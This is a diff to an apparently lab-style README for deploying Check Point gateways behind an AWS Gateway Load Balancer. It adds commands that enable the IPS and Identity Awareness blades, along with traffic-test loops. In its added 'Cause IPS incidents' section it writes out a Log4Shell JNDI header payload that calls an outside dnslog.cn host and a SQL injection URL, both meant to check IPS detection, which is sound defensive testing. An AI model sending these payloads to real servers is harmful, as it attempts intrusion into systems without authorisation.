@@ -99,6 +99,12 @@ Make sure CME is installed and login to CHKP Management server to run this comma
 autoprov_cfg -f init AWS -ak AKIAZTAmodified -sk /MNFoeHQdbTBVnammodified -mn chkp-mgmt -tn chkp-gwlb-template -cn gwlb-controller -po Standard -otp Vpn12modified -r eu-central-1 -ver R80.40
 ```
 
+Enable additional blades -  e.g. Identity Awareness and IPS:
+```
+autoprov_cfg set template -tn chkp-gwlb-template -ips
+autoprov_cfg set template -tn chkp-gwlb-template -ia
+```
+
 ### 8. Monitor CME provisioning on Management Server
 
 Open SmartConsole and monitor Gateways section for ASG instances to appear and to be provisioned with policy.
@@ -121,4 +127,16 @@ Connect to instances using Session Manager and initiate traffic to Internet (*cu
 Keep connecting and report egress IP. Run on instance in TGW attachment subnet.
 ```
 while true; do I=$(curl -s ip.iol.cz/ip/); echo $I; done
+```
+
+Other example:
+```
+while true; do date; ping -c 3 1.1.1.1; echo; done
+```
+
+Cause IPS incidents (should be prevented/catched by IPS if configured):
+```
+curl yourserver.xyz -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}' -v
+
+curl -k 'http://yourserver.xyz/mutillidae/index.php?page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details'
 ```
